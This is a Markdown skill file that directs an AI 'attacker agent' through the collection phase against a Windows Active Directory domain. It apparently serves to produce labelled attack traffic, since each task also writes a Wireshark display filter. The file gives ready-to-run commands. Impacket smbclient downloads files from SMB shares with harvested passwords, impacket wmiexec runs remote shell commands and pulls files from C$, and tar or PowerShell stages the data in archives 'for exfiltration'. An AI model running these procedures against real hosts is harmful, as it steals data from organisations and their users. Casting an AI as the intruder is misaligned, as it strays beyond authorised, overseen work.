---
name: ad-collection
description: Collection-phase Active Directory skill for an attacker agent on a domain-joined Windows host. Covers share download, local-file collection, and archiving staged data. Load this skill when the task names ad-collection. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
---

# AD Collection Skill

Load this skill **only** when the dispatched task names `ad-collection`. Do not load other phase catalogs.

**Shared runtime.** `cd` to `~/.config/opencode/skills/ad-attack` (or the packaged `attacker/skills/ad-attack`) before any `python scripts/...` call. Follow the Mandatory Execution Protocol in the `ad-attack` skill, including Step 5 (write `{task_id}.txt`).

**Traffic filter contract.** Time-window slicing is a later extract step. This skill writes **only** a Wireshark display filter — never a tshark command, never `frame.time_epoch`. Host-local techniques with no packets use `frame.number == 0`.

# Phase 4: Collection

## 4.1 Data from Network Shared Drive

- Technique id: `collection.share-download`
- ATT&CK: T1039 (Data from Network Shared Drive)

Purpose: download a sensitive file from an SMB share.

Inputs: a host object with `shares`, a user object with `password` from `users`, and the share name (from `hosts[].shares`). The file path to download is a task-text intent (or discovered by `ls` inside the share).

Procedure (one atomic action — connect, download one file, exit):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
```

Inside the client: `use <share>`, `cd <dir>`, `get <file>`, `exit`.

Outputs:

```
python scripts/state.py add files '{"path": "<local-download-path>", "description": "downloaded from \\\\<host>\\<share>\\<file>"}'
```

Rollback: if the file is gone or the share changed, `mark-stale` the host object and re-run `discovery.share-enum`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 4.2 Local File Collection
- Technique id: `collection.local-file`
- ATT&CK: T1005 (Data from Local System)

Purpose: enumerate and retrieve files of interest from a compromised host's local filesystem.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action — list via remote shell, then download):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'dir /s /b C:\Users'
```

Then use `smbclient` (`use C$`) to `get` the chosen file.

Outputs:

```
python scripts/state.py add files '{"path": "<local-download-path>", "description": "collected from <target-ip> <remote-path>"}'
```

Rollback: if a file moves, `mark-stale` the entry and re-run.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 4.3 Archive Collected Data
- Technique id: `collection.archive`
- ATT&CK: T1560 (Archive Collected Data), T1560.001 (Archive via Utility)

Purpose: stage and compress collected files for exfiltration.

Inputs: files already recorded in `files[]` (or staged under `campaign.staging_dir`).

Procedure (one atomic action):

```
tar -cf <campaign.staging_dir>/collected.tar -C <campaign.staging_dir> <files...>
```

or

```
powershell -c "Compress-Archive -Path <campaign.staging_dir>\* -DestinationPath <campaign.staging_dir>\collected.zip"
```

Outputs:

```
python scripts/state.py add files '{"path": "<campaign.staging_dir>/collected.tar", "description": "staged archive of collected data"}'
```

Rollback: re-run after adding or removing staged files.


Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
frame.number == 0
```

